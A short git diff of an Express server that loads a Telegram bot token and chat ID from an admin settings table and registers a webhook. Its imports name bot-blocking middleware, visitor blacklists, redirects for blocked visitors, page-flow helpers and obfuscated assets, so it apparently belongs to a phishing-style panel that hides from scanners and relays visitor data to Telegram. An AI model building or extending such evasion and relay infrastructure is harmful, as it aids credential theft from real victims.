@@ -8,7 +8,7 @@ import path from "path";
 import { fileURLToPath } from "url";
 import createRoutes from "./routes/routes.js";
 import { blacklistMiddleware, createBotRouter } from './middleware/frontblock.js';
-import { getClientIP, getNextPage, pageFlow, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets } from "./utils.js";
+import { getClientIP, getNextPage, setWebhook, pageFlow, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets } from "./utils.js";
 import capRouter, { requireCap } from "./altcheck.js";
 import geoip from "geoip-lite";
 import session from "express-session"; 
@@ -65,6 +65,13 @@ app.use("/", capRouter);
   app.use('/', createBotRouter(db, io));
 
   console.log("✅ Routes and botRouter loaded.");
+  
+  const telegramInfo = await db.get(
+	  `SELECT BotToken, ChatID, TelegramEnabled FROM admin_settings WHERE id = ?`,
+	  [1]
+	);
+
+	setWebhook(telegramInfo.BotToken, 3000);
 
   
 // ----------------------
